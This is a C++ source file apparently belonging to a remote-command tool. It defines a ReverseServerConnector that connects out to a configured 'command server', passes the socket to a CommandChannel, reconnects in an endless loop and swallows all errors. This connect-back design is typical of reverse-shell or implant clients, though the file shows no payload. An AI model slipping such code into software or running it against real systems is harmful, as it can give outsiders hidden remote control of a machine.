#include <boost/asio/io_service.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/log/trivial.hpp>
#include "reverse_server_connector.h"
#include "command_channel.h"

using std::string;
using std::exception;
using std::move;
using std::to_string;
using std::make_shared;

using boost::asio::io_service;
using boost::asio::ip::tcp;

ReverseServerConnector::ReverseServerConnector(const string& hostname, uint16_t port,
                                               io_service& service)
: hostname_(hostname), port_(port), io_service_(service) {

}

void ReverseServerConnector::run() {
    BOOST_LOG_TRIVIAL(debug) << "Connecting to command server " << hostname_ << ":" << port_;
    tcp::resolver name_resolver(io_service_);
    tcp::resolver::query query(hostname_, to_string(port_));
    tcp::endpoint ep = *name_resolver.resolve(query);
    while (true) {
        tcp::socket server_socket(io_service_);
        server_socket.connect(ep);
        BOOST_LOG_TRIVIAL(debug) << "Connection established";

        auto channel = make_shared<CommandChannel>(move(server_socket));
        try {
            channel->run();
        }
        catch (exception& ex) {

        }
    }
}
